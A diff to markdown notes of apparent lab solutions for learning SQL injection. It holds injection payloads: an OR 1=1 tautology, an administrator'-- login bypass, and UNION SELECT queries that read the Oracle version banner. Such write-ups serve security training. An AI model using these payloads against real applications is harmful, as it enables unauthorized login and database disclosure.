@@ -19,7 +19,7 @@ table_type: The type of the table, such as "BASE TABLE" or "VIEW".
 
 ## Solution:
 - Lab 1: Retrieval of Hidden Data(Where): `Modify the category parameter, giving it the value '+OR+1=1--`
-- Lab 2: SQL injection vulnerability allowing login bypass: `Modify the username parameter, giving it the value: administrator'--` or `enter ' OR 1=1-- in username & pwd field`
+- Lab 2: SQL injection vulnerability allowing login bypass: `Modify the username parameter, giving it the value: administrator'--` or enter `' OR 1=1--` in username & pwd field
 - Lab 3: Querying the database type and version on Oracle:
     - Verify the `number of columns` that are being returned by the query and which columns contain text data `'Union+SELECT+'NULL','NULL'+FROM+DUAL--`
     - Add the Payload in URL `'UNION+SELECT+banner,NULL+FROM+v$version--`
